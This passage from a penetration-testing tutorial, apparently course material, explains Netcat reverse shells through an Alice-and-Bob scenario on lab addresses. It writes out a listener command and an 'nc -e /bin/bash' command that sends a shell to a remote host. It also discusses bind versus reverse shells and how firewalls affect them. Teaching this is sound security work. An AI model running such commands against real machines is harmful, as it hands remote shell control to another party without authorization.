In our second scenario, Alice needs help from Bob. However, Alice has no control over the router in her office, and therefore cannot forward traffic from the router to her internal machine. 

In this scenario, we can leverage another useful feature of Netcat; the ability to send a command shell to a host listening on a specific port. 

In this situation, although Alice cannot bind a port to /bin/bash locally on her computer and expect Bob to connect, she can send control of her command prompt to Bob’s machine instead.

This is known as a reverse shell. To get this working, Bob will first set up Netcat to listen for an incoming shell. We will use port 4444 in our example:

	C:\Users\offsec> nc -nlvp 4444 listening on [any] 4444 ...

Now, Alice can send a reverse shell from her Linux machine to Bob. Once again, we use the -e option to make an application available remotely, which in this case happens to be /bin/bash, the Linux shell:

	kali@kali:~$ ip address show eth0 | grep inet inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0

	kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash (UNKNOWN) [10.11.0.22] 4444 (?) open

Once the connection is established, Alice’s Netcat will have redirected /bin/bash input, output, and error data streams to Bob’s machine on port 4444, and Bob can interact with that shell:

Take some time to consider the differences between bind and reverse shells, and how these differences may apply to various firewall configurations from an organizational security standpoint. It is important to realize that outgoing traffic can be just as harmful as incoming traffic.

It’s not uncommon for host-based firewalls to block access to our precious bind shells. This can be incredibly frustrating at times, especially when under pressure and dealing with time constraints. When in doubt, we use a reverse shell as they are typically easier to troubleshoot.